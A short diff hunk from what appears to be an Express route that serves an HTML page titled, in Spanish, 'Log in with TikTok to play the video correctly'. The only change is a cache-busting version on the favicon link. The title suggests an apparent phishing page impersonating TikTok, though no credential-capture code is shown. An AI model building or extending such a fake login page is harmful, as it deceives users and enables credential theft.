@@ -34,7 +34,8 @@ res.send(`
 
 <title>Inicia sesión con TikTok para reproducir correctamente el video</title>
 
-<link rel="icon" type="image/png" href="/icon.png">
+<link rel="icon" type="image/png" href="/icon.png?v=2">
+
 <style>
 
 *{
